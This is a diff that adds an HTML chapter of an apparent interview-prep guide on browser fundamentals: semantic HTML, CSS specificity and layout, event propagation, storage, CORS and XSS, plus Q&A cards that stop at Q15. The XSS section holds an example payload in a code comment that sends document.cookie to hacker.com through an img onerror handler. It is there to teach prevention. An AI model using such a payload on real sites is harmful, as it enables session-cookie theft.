@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chapter 6: HTML, CSS, and Browser Fundamentals | Full-Stack Interview Guide</title>
+  <meta name="description" content="In-depth guide to Browser Fundamentals: Semantic HTML5, CSS Specificity, Box Model, Flexbox vs Grid, Stacking Contexts, Event Bubbling & Delegation, CORS, and XSS prevention.">
+  
+  <link rel="stylesheet" href="../assets/css/theme.css">
+  <link rel="stylesheet" href="../assets/css/code.css">
+  <link rel="stylesheet" href="../assets/css/main.css">
+  <link rel="stylesheet" href="../assets/css/print.css" media="print">
+</head>
+<body class="chapter-page" data-chapter-id="6">
+
+  <header class="site-header">
+    <div class="header-left">
+      <button class="menu-toggle" type="button" aria-label="Toggle navigation menu">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+      <a href="../index.html" class="brand-link">
+        <svg class="brand-icon" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
+        <span>FullStack.Prep</span>
+      </a>
+    </div>
+
+    <div class="header-right">
+      <button class="search-trigger" type="button">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        <span>Search...</span>
+        <kbd class="search-shortcut">Ctrl+K</kbd>
+      </button>
+      <button class="theme-toggle" type="button" aria-label="Toggle theme"></button>
+    </div>
+  </header>
+
+  <div class="main-layout">
+    <aside id="book-sidebar" class="sidebar"></aside>
+
+    <main class="content-area">
+      <div class="content-inner">
+        
+        <header class="chapter-header">
+          <div class="chapter-part-label">PART I — Programming Foundations and JavaScript</div>
+          <h1 class="chapter-title">Chapter 6: HTML, CSS, and Browser Fundamentals</h1>
+          <p class="chapter-lead">
+            The foundation of web client engineering: Semantic markup, accessible ARIA patterns, CSS specificity algorithms, the box model, Flexbox vs CSS Grid, stacking contexts and z-index debugging, DOM event bubbling and delegation, client storage mechanisms, CORS, and XSS security.
+          </p>
+          
+          <div class="chapter-meta-bar">
+            <div class="chapter-meta-tags">
+              <span class="meta-pill" id="chapter-reading-time">Calculating read time...</span>
+              <span class="meta-pill">Browser & DOM</span>
+              <span class="meta-pill">20 Interview Questions</span>
+            </div>
+            <div class="chapter-action-btns">
+              <button id="btn-toggle-complete" class="action-btn" type="button">Mark Complete</button>
+              <button id="btn-toggle-bookmark" class="action-btn" type="button">Save for Revision</button>
+            </div>
+          </div>
+        </header>
+
+        <div class="callout callout-important">
+          <div class="callout-title">🎯 Learning Objectives for This Chapter</div>
+          <ul>
+            <li>Understand why Semantic HTML directly impacts accessibility (a11y), SEO, and machine readability.</li>
+            <li>Calculate CSS Specificity mathematically and resolve CSS conflicts predictably.</li>
+            <li>Master the CSS Box Model: <code>content-box</code> vs <code>border-box</code> and margin collapsing rules.</li>
+            <li>Know precisely when to choose Flexbox (one-dimensional) vs CSS Grid (two-dimensional).</li>
+            <li>Debug <code>z-index</code> issues by understanding how browser <strong>Stacking Contexts</strong> are formed.</li>
+            <li>Master DOM Event Propagation: Capturing phase, Target phase, and Bubbling phase.</li>
+            <li>Implement the <strong>Event Delegation Pattern</strong> to handle dynamic DOM elements with minimal memory footprint.</li>
+            <li>Compare <code>localStorage</code>, <code>sessionStorage</code>, <code>cookies</code>, and <code>IndexedDB</code> across security and storage limits.</li>
+            <li>Deconstruct Cross-Origin Resource Sharing (CORS) preflight <code>OPTIONS</code> requests and fix CORS errors.</li>
+            <li>Prevent Cross-Site Scripting (XSS) via safe DOM manipulation and Content Security Policy (CSP) headers.</li>
+          </ul>
+        </div>
+
+        <!-- Section 1 -->
+        <h2>1. Semantic HTML and Accessibility (a11y)</h2>
+        <p>
+          Semantic HTML means using HTML markup to reinforce the <strong>meaning</strong> of the information in web pages, rather than merely defining its visual appearance.
+        </p>
+
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Semantic Landmark Tag</th>
+                <th>Architectural Purpose</th>
+                <th>Screen Reader & SEO Impact</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>&lt;header&gt;</code></td>
+                <td>Introductory content, site branding, navigational bar.</td>
+                <td>Identified as landmark banner; aids quick keyboard navigation.</td>
+              </tr>
+              <tr>
+                <td><code>&lt;nav&gt;</code></td>
+                <td>Major navigation blocks linking to pages or internal sections.</td>
+                <td>Screen readers allow users to jump directly past or into navigation.</td>
+              </tr>
+              <tr>
+                <td><code>&lt;main&gt;</code></td>
+                <td>Dominant, central content unique to this document.</td>
+                <td>Exactly one per document. Users can skip repetitive headers directly to main.</td>
+              </tr>
+              <tr>
+                <td><code>&lt;article&gt;</code></td>
+                <td>Self-contained, reusable composition (blog post, product card, forum comment).</td>
+                <td>Can be distributed independently via RSS feeds and news aggregators.</td>
+              </tr>
+              <tr>
+                <td><code>&lt;section&gt;</code></td>
+                <td>Generic standalone thematic section of a document.</td>
+                <td>Should typically begin with a heading tag (<code>&lt;h2&gt;</code>).</td>
+              </tr>
+              <tr>
+                <td><code>&lt;aside&gt;</code></td>
+                <td>Content tangentially related to the surrounding content (sidebar, callout).</td>
+                <td>Screen readers can skip aside content when reading main flow.</td>
+              </tr>
+              <tr>
+                <td><code>&lt;button&gt;</code> vs <code>&lt;div onclick&gt;</code></td>
+                <td>Interactive trigger for actions.</td>
+                <td>Native keyboard focusable (Tab), triggers on Space and Enter, exposes button role.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout callout-warning">
+          <div class="callout-title">⚠️ The Anti-Pattern: "Div Soup"</div>
+          <p>
+            Replacing buttons with <code>&lt;div class="btn" onclick="..."&gt;</code> breaks accessibility! A div cannot be focused via the Tab key, does not respond to Enter or Space, and is completely invisible to screen readers unless you manually add <code>tabindex="0"</code>, <code>role="button"</code>, and keyboard event handlers. Always use native <code>&lt;button&gt;</code> elements for actions and <code>&lt;a href="..."&gt;</code> for page navigations!
+          </p>
+        </div>
+
+        <hr>
+
+        <!-- Section 2 -->
+        <h2>2. CSS Specificity and the Box Model</h2>
+
+        <h3>The Specificity Calculation Matrix</h3>
+        <p>
+          When multiple conflicting CSS rules target the same element, the browser calculates a 4-column specificity tuple <code>(Inline, ID, Class, Element)</code>:
+        </p>
+        <ul>
+          <li><strong>Inline Styles (1, 0, 0, 0):</strong> Styles applied directly on the HTML element via <code>style="..."</code>.</li>
+          <li><strong>IDs (0, 1, 0, 0):</strong> Selectors targeting an ID, e.g., <code>#navbar</code>.</li>
+          <li><strong>Classes, Attributes, and Pseudo-classes (0, 0, 1, 0):</strong> E.g., <code>.btn</code>, <code>[type="text"]</code>, <code>:hover</code>, <code>:focus</code>.</li>
+          <li><strong>Elements and Pseudo-elements (0, 0, 0, 1):</strong> E.g., <code>div</code>, <code>p</code>, <code>::before</code>, <code>::after</code>.</li>
+          <li><strong>Universal selector (<code>*</code>) and combinators (<code>+</code>, <code>&gt;</code>, <code>~</code>):</strong> Specificity of (0, 0, 0, 0).</li>
+          <li><strong><code>!important</code>:</strong> Overrides the standard specificity hierarchy completely.</li>
+        </ul>
+
+        <div class="diagram-container">
+          <div class="ascii-diagram">
+Selector: #main-nav .menu-item a:hover
+  - IDs:             #main-nav                  --> 1 (Weight: 100)
+  - Classes/Pseudos: .menu-item, :hover         --> 2 (Weight: 20)
+  - Elements:        a                          --> 1 (Weight: 1)
+Total Specificity: (0, 1, 2, 1) = Beats any selector with 0 IDs regardless of class count!
+          </div>
+          <div class="diagram-caption">Figure 6.1: Specificity Calculation Breakdown</div>
+        </div>
+
+        <h3>The Box Model: <code>content-box</code> vs <code>border-box</code></h3>
+        <p>
+          Every HTML element rendered on the page is an enclosed rectangular box consisting of four layers: <strong>Content</strong>, <strong>Padding</strong>, <strong>Border</strong>, and <strong>Margin</strong>.
+        </p>
+
+        <div class="diagram-container">
+          <div class="ascii-diagram">
++-----------------------------------------------------------+
+|                          MARGIN                           |
+|   +---------------------------------------------------+   |
+|   |                      BORDER                       |   |
+|   |   +-------------------------------------------+   |   |
+|   |   |                  PADDING                  |   |   |
+|   |   |   +-----------------------------------+   |   |   |
+|   |   |   |                                   |   |   |   |
+|   |   |   |              CONTENT              |   |   |   |
+|   |   |   |       (width x height)            |   |   |   |
+|   |   |   |                                   |   |   |   |
+|   |   |   +-----------------------------------+   |   |   |
+|   |   +-------------------------------------------+   |   |
+|   +---------------------------------------------------+   |
++-----------------------------------------------------------+
+          </div>
+          <div class="diagram-caption">Figure 6.2: The Standard CSS Box Model</div>
+        </div>
+
+        <ul>
+          <li><strong><code>content-box</code> (Default):</strong> The CSS <code>width</code> property sets ONLY the content width. Adding padding (20px) and border (2px) expands the element's actual rendered width on the screen:
+            \[\text{Total Width} = \text{width} + \text{padding-left} + \text{padding-right} + \text{border-left} + \text{border-right}\]
+          </li>
+          <li><strong><code>border-box</code> (Industry Standard):</strong> The CSS <code>width</code> property sets the TOTAL rendered width including padding and border:
+            \[\text{Content Width} = \text{width} - \text{padding} - \text{border}\]
+          </li>
+        </ul>
+
+        <pre><code class="language-css">/* Universal Box-Sizing Reset used in every modern production project */
+*, *::before, *::after {
+  box-sizing: border-box;
+}</code></pre>
+
+        <hr>
+
+        <!-- Section 3 -->
+        <h2>3. Flexbox versus CSS Grid</h2>
+        <p>
+          The golden rule for choosing modern CSS layout engines:
+        </p>
+        <ul>
+          <li><strong>Flexbox:</strong> Designed for <strong>One-Dimensional layouts</strong> (distributing items along a single axis: either a row OR a column). Ideal for navbars, toolbars, vertical lists, card headers, and centering items.</li>
+          <li><strong>CSS Grid:</strong> Designed for <strong>Two-Dimensional layouts</strong> (simultaneously managing rows AND columns). Ideal for full-page dashboards, photo galleries, magazine grids, and complex UI shells.</li>
+        </ul>
+
+        <pre><code class="language-css">/* Centering any element perfectly in Flexbox */
+.flex-center {
+  display: flex;
+  justify-content: center; /* Main axis (horizontal) */
+  align-items: center;     /* Cross axis (vertical) */
+}
+
+/* Responsive Auto-Fitting Grid without media queries! */
+.responsive-card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 1.5rem;
+}</code></pre>
+
+        <hr>
+
+        <!-- Section 4 -->
+        <h2>4. Stacking Contexts and z-index Debugging</h2>
+        <p>
+          A common developer frustration is setting <code>z-index: 999999</code> on an element, only for it to remain stubbornly hidden behind another element with <code>z-index: 1</code>.
+        </p>
+        <p>
+          This occurs because <code>z-index</code> only compares elements that participate in the <strong>same Stacking Context</strong>. An element in a lower stacking context can <em>never</em> appear in front of an element in a higher stacking context, no matter how high its internal <code>z-index</code> is!
+        </p>
+
+        <h3>What Creates a New Stacking Context?</h3>
+        <ul>
+          <li>The root document element (<code>&lt;html&gt;</code>).</li>
+          <li>An element with <code>position: relative</code> or <code>absolute</code> and a <code>z-index</code> other than <code>auto</code>.</li>
+          <li>An element with <code>position: fixed</code> or <code>sticky</code>.</li>
+          <li>An element with <code>opacity</code> less than <code>1</code>.</li>
+          <li>An element with <code>transform</code>, <code>filter</code>, <code>perspective</code>, or <code>clip-path</code> not equal to <code>none</code>.</li>
+          <li>An element with <code>isolation: isolate</code> (the modern, clean way to force a new stacking context!).</li>
+        </ul>
+
+        <hr>
+
+        <!-- Section 5 -->
+        <h2>5. DOM Event Propagation: Capturing, Target, and Bubbling</h2>
+        <p>
+          When an event (like a <code>click</code>) fires on a deeply nested element, it does not just execute on that element. It travels through <strong>three sequential phases</strong>:
+        </p>
+
+        <div class="diagram-container">
+          <div class="ascii-diagram">
+                              | |
+               1. CAPTURING   | |  3. BUBBLING
+                  PHASE       | |     PHASE
+                              | |
+        Window                | |  ^               Window
+          |                   | |  |                 |
+          v                   | |  |                 |
+        Document              | |  |               Document
+          |                   | |  |                 |
+          v                   | |  |                 |
+        <html>                | |  |               <html>
+          |                   | |  |                 |
+          v                   | |  |                 |
+        <body>                | |  |               <body>
+          |                   | |  |                 |
+          v                   | |  |                 |
+        <div>                 | |  |               <div>
+          |                   | |  |                 |
+          v                   | |  |                 |
+        <button>              v |  |               <button>
+                   +------------------------+
+                   |    2. TARGET PHASE     |
+                   +------------------------+
+          </div>
+          <div class="diagram-caption">Figure 6.3: The Three Phases of DOM Event Propagation</div>
+        </div>
+
+        <ol>
+          <li><strong>Capturing Phase:</strong> The event descends from <code>window</code> down through the DOM tree toward the target node. (Listeners registered with <code>addEventListener('click', fn, true)</code> fire here).</li>
+          <li><strong>Target Phase:</strong> The event reaches the actual target element that was clicked (<code>event.target</code>).</li>
+          <li><strong>Bubbling Phase:</strong> The event bubbles back up from the target element through all its parent ancestor nodes up to <code>window</code>. (Standard listeners registered with <code>addEventListener('click', fn, false)</code> fire here).</li>
+        </ol>
+
+        <h3>Event Delegation Pattern</h3>
+        <p>
+          Instead of attaching 1,000 separate click event listeners to 1,000 list items (which burns memory and leaks when items are dynamically added), attach a <strong>single event listener</strong> to the parent container and utilize event bubbling:
+        </p>
+
+        <pre><code class="language-javascript">// Event Delegation
+const taskList = document.getElementById("task-list");
+
+taskList.addEventListener("click", (event) => {
+  // Find closest button ancestor (in case user clicked an icon inside the button)
+  const deleteBtn = event.target.closest(".btn-delete");
+  if (!deleteBtn) return;
+
+  const taskId = deleteBtn.dataset.taskId;
+  console.log(`Deleting task ID: ${taskId}`);
+  // deleteBtn.closest('.task-item').remove();
+});</code></pre>
+
+        <hr>
+
+        <!-- Section 6 -->
+        <h2>6. Client-Side Storage Mechanisms</h2>
+
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Feature</th>
+                <th><code>localStorage</code></th>
+                <th><code>sessionStorage</code></th>
+                <th>Cookies (<code>document.cookie</code>)</th>
+                <th><code>IndexedDB</code></th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Capacity</strong></td>
+                <td>~5 MB per origin</td>
+                <td>~5 MB per origin</td>
+                <td>~4 KB per cookie</td>
+                <td>Hundreds of MBs / GBs</td>
+              </tr>
+              <tr>
+                <td><strong>Lifetime</strong></td>
+                <td>Persistent until explicitly deleted by code or user clearing data.</td>
+                <td>Scoped to browser tab session (deleted when tab closes).</td>
+                <td>Configured via <code>Expires</code> or <code>Max-Age</code>; session by default.</td>
+                <td>Persistent.</td>
+              </tr>
+              <tr>
+                <td><strong>Sent with HTTP Requests?</strong></td>
+                <td>No</td>
+                <td>No</td>
+                <td><strong>Yes</strong> (Sent automatically in <code>Cookie</code> header on every request).</td>
+                <td>No</td>
+              </tr>
+              <tr>
+                <td><strong>API Type</strong></td>
+                <td>Synchronous key-value</td>
+                <td>Synchronous key-value</td>
+                <td>Synchronous string</td>
+                <td>Asynchronous (Event/Promise-based object database)</td>
+              </tr>
+              <tr>
+                <td><strong>Security Flags</strong></td>
+                <td>None (Vulnerable to XSS)</td>
+                <td>None (Vulnerable to XSS)</td>
+                <td><code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code></td>
+                <td>Same-origin policy</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <hr>
+
+        <!-- Section 7 -->
+        <h2>7. Browser Security: CORS and XSS</h2>
+
+        <h3>CORS (Cross-Origin Resource Sharing)</h3>
+        <p>
+          By default, browsers enforce the <strong>Same-Origin Policy (SOP)</strong>: scripts running on Origin A (<code>https://myapp.com:443</code>) cannot read response data fetched from Origin B (<code>https://api.other.com:443</code>).
+        </p>
+        <p>
+          An origin is defined by the exact tuple: <strong>(Protocol, Domain, Port)</strong>. If any one differs, it is cross-origin!
+        </p>
+
+        <div class="diagram-container">
+          <div class="ascii-diagram">
+Client (https://frontend.com)                           Server (https://api.backend.com)
+       |                                                              |
+       | --- Preflight: OPTIONS /api/data --------------------------> |
+       |     Origin: https://frontend.com                             |
+       |     Access-Control-Request-Method: POST                      |
+       |     Access-Control-Request-Headers: Content-Type, Auth       |
+       |                                                              |
+       | <--- Preflight OK: 204 No Content -------------------------- |
+       |      Access-Control-Allow-Origin: https://frontend.com       |
+       |      Access-Control-Allow-Methods: GET, POST, OPTIONS        |
+       |      Access-Control-Allow-Headers: Content-Type, Auth        |
+       |                                                              |
+       | --- Actual Request: POST /api/data ------------------------> |
+       | <--- 200 OK (JSON Payload) --------------------------------- |
+          </div>
+          <div class="diagram-caption">Figure 6.4: CORS Preflight Handshake Flow</div>
+        </div>
+
+        <h3>XSS (Cross-Site Scripting) and Safe DOM Manipulation</h3>
+        <p>
+          XSS occurs when an application includes untrusted user input directly into HTML without sanitization, allowing attackers to execute arbitrary JavaScript in victim browsers.
+        </p>
+
+        <pre><code class="language-javascript">// VULNERABLE TO XSS:
+// If comment.body is '<img src=x onerror="fetch(\'https://hacker.com/steal?c=\' + document.cookie)">'
+// this executes the attacker's script and steals session cookies!
+container.innerHTML = `&lt;p&gt;${comment.body}&lt;/p&gt;`;
+
+// SAFE: textContent encodes characters into harmless plain text entities
+const p = document.createElement("p");
+p.textContent = comment.body;
+container.appendChild(p);</code></pre>
+
+        <hr>
+
+        <!-- Section 8: Interview Questions and Answers -->
+        <section class="interview-section">
+          <h2>Interview Questions and Answers</h2>
+          <p style="color: var(--text-muted); margin-bottom: 1.5rem;">
+            20 high-frequency technical interview questions testing your mastery of DOM rendering, CSS mechanics, event architecture, browser storage, and client security.
+          </p>
+
+          <div class="qa-toolbar">
+            <div class="qa-filter-btns">
+              <button class="qa-filter-btn active" data-filter="all">All (20)</button>
+              <button class="qa-filter-btn" data-filter="beginner">Beginner</button>
+              <button class="qa-filter-btn" data-filter="intermediate">Intermediate</button>
+              <button class="qa-filter-btn" data-filter="advanced">Advanced</button>
+              <button class="qa-filter-btn" data-filter="scenario">Scenario</button>
+            </div>
+            <button class="qa-toggle-all" type="button">Expand All Answers</button>
+          </div>
+
+          <!-- Q1 -->
+          <details class="qa-card diff-beginner">
+            <summary class="qa-summary">
+              <span class="qa-num">Q1</span>
+              <span class="qa-title">What is the CSS Box Model, and what is the difference between `content-box` and `border-box`?</span>
+              <span class="qa-difficulty diff-beginner">Beginner</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "The CSS Box Model describes the rectangular boxes generated for elements, consisting of Content, Padding, Border, and Margin. With `content-box` (the default), setting `width: 200px` applies only to the content area; adding 20px padding and 2px border expands the total element width to 244px. With `border-box`, setting `width: 200px` guarantees that the total rendered width—including padding and border—remains exactly 200px. Because it makes responsive layouts predictable, we universally reset all elements to `box-sizing: border-box`."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q2 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q2</span>
+              <span class="qa-title">How is CSS Specificity calculated? How does `!important` affect the cascade?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Specificity is calculated as a four-part score: (Inline styles, IDs, Classes/Attributes/Pseudo-classes, Element tags). A selector with an ID always overrides any number of classes. When specificity scores are identical, the last declared rule in the stylesheet wins. Adding `!important` bypasses normal specificity completely; an `!important` rule can only be overridden by another `!important` rule with higher specificity. We avoid `!important` in production because it breaks the natural CSS cascade."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q3 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q3</span>
+              <span class="qa-title">Explain the three phases of DOM Event Propagation.</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "When an event occurs, it executes in three phases: 1. The Capturing Phase, where the event travels downward from `window` through ancestors to the target element. 2. The Target Phase, where the event triggers directly on the clicked element. 3. The Bubbling Phase, where the event bubbles back upward from the target element through all parent ancestors to `window`. Standard addEventListener listeners fire during the Bubbling phase unless the `capture: true` option is passed."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q4 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q4</span>
+              <span class="qa-title">What is the difference between `event.stopPropagation()` and `event.stopImmediatePropagation()`?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "`event.stopPropagation()` prevents the event from continuing to bubble up (or capture down) the DOM tree to ancestor elements, but other listeners attached to the *same element* will still execute. `event.stopImmediatePropagation()` stops bubbling up the tree AND immediately halts execution of any other remaining event listeners attached to the exact same element."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q5 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q5</span>
+              <span class="qa-title">What is Event Delegation, and what are its performance and architectural advantages?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Event delegation is a design pattern where you attach a single event listener to a common parent element rather than attaching individual listeners to multiple child elements. It leverages event bubbling: events on child elements bubble up to the parent, which inspects `event.target` (or `event.target.closest()`). It dramatically reduces memory usage and automatically works for dynamically added child elements without needing to attach new listeners."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q6 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q6</span>
+              <span class="qa-title">What is a Stacking Context in CSS, and why might an element with `z-index: 9999` be hidden behind an element with `z-index: 1`?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "A Stacking Context is a 3D conceptual layering of HTML elements along the Z-axis. `z-index` values only compete with sibling elements within the same stacking context. If Element A belongs to a parent whose stacking context has a lower z-index than Element B's parent, Element A can never appear above Element B, even if its internal z-index is set to 999999. Stacking contexts are created by properties like position relative with z-index, opacity < 1, transform, or `isolation: isolate`."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q7 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q7</span>
+              <span class="qa-title">Compare Flexbox and CSS Grid. When would you choose one over the other?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Flexbox is a one-dimensional layout system: it aligns items along a single axis (row or column). I choose Flexbox for UI components like navigation bars, button groups, centering cards, and vertical stacks. CSS Grid is a two-dimensional layout system: it arranges items simultaneously across both rows and columns. I choose Grid for page-level layouts, dashboard widgets, image galleries, and structured multi-column forms."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q8 -->
+          <details class="qa-card diff-beginner">
+            <summary class="qa-summary">
+              <span class="qa-num">Q8</span>
+              <span class="qa-title">Compare `localStorage`, `sessionStorage`, and `cookies`. What are their primary differences?</span>
+              <span class="qa-difficulty diff-beginner">Beginner</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "`localStorage` stores up to 5MB of key-value data with no expiration; it persists across browser sessions and tabs. `sessionStorage` also stores 5MB but is scoped to a single tab session, clearing automatically when the tab closes. Cookies store only ~4KB and are automatically sent to the server in the HTTP `Cookie` header on every request. Cookies can be protected with `HttpOnly` to prevent XSS theft, whereas `localStorage` is always accessible to JavaScript."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q9 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q9</span>
+              <span class="qa-title">What triggers a CORS preflight `OPTIONS` request? What defines a "Simple Request"?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "A preflight request is an HTTP `OPTIONS` request sent automatically by the browser to ask the server permission before sending the actual cross-origin request. A request is 'Simple' (skipping preflight) only if it uses GET, POST, or HEAD, uses safe headers (Accept, Accept-Language, Content-Language), and its Content-Type is application/x-www-form-urlencoded, multipart/form-data, or text/plain. As soon as you send JSON (`application/json`) or custom headers like `Authorization`, the browser triggers a preflight request."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q10 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q10</span>
+              <span class="qa-title">What is Cross-Site Scripting (XSS)? What is the difference between Stored, Reflected, and DOM-based XSS?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "XSS is an attack where malicious JavaScript is injected into a trusted web application. Stored XSS occurs when malicious input is saved permanently in the database (like a malicious comment) and served to all future visitors. Reflected XSS occurs when malicious script in a URL query parameter is reflected immediately in the server's HTML response. DOM-based XSS occurs entirely client-side when JavaScript reads from an untrusted source (like location.search) and inserts it directly into the DOM via innerHTML without sanitization."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q11 -->
+          <details class="qa-card diff-beginner">
+            <summary class="qa-summary">
+              <span class="qa-num">Q11</span>
+              <span class="qa-title">Why should you avoid `innerHTML` when displaying user input, and what should you use instead?</span>
+              <span class="qa-difficulty diff-beginner">Beginner</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "`innerHTML` parses the supplied string as live HTML, allowing malicious script tags or image error handlers (`<img src=x onerror=...>`) to execute arbitrary code, leading to XSS vulnerabilities. Instead, you should use `element.textContent`, which treats all inputs strictly as raw text and automatically encodes dangerous HTML characters into harmless entities."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q12 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q12</span>
+              <span class="qa-title">What is Content Security Policy (CSP), and how does it prevent XSS exploitation?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Content Security Policy is an HTTP response header (e.g., `Content-Security-Policy: default-src 'self'`) that allows site administrators to restrict the resources (scripts, images, stylesheets, iframes) the browser is permitted to load for a given page. It mitigates XSS by disallowing inline scripts (`<script>...</script>`), blocking `eval()`, and refusing to load external scripts from unauthorized third-party domains."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q13 -->
+          <details class="qa-card diff-scenario">
+            <summary class="qa-summary">
+              <span class="qa-num">Q13</span>
+              <span class="qa-title">Scenario: How do you build an accessible Modal Dialog adhering to WAI-ARIA guidelines?</span>
+              <span class="qa-difficulty diff-scenario">Scenario</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "An accessible modal requires four criteria: 1. Semantic attributes: `role='dialog'`, `aria-modal='true'`, and `aria-labelledby` referencing the modal title. 2. Focus Management: Move keyboard focus inside the modal upon opening, and restore focus to the triggering button upon closing. 3. Focus Trapping: When the user presses Tab or Shift+Tab, keep focus cycling strictly within the modal's interactive elements. 4. Dismissal: Listen for the Escape key and outside backdrop clicks to close the modal."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q14 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q14</span>
+              <span class="qa-title">What are CSS Custom Properties (Variables), and what advantages do they have over SASS/SCSS variables?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "CSS Custom Properties (`--my-var: #2563eb`) are native runtime CSS variables that participate in the DOM cascade and inheritance. SASS variables are evaluated at build time and cannot be altered dynamically in the browser. Because CSS variables exist at runtime, you can re-theme entire sites instantly using JavaScript (`document.documentElement.style.setProperty`), adapt them in media queries, and inherit them down DOM component trees."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q15 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q15</span>
+              <span class="qa-title">What is Margin Collapsing in CSS, and when does it occur?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Margin collapsing occurs when vertical (top and bottom) margins of adjacent block elements combine into a single margin whose size is equal to the largest individual margin, rather than adding together. It occurs between adjacent sibling blocks, between a parent and its first/last child when no border or padding separates them, and on empty blocks. Margin collapsing does NOT occur on horizontal margins, flex items, or grid items."
+                </p>
+              </div>
+            </div>
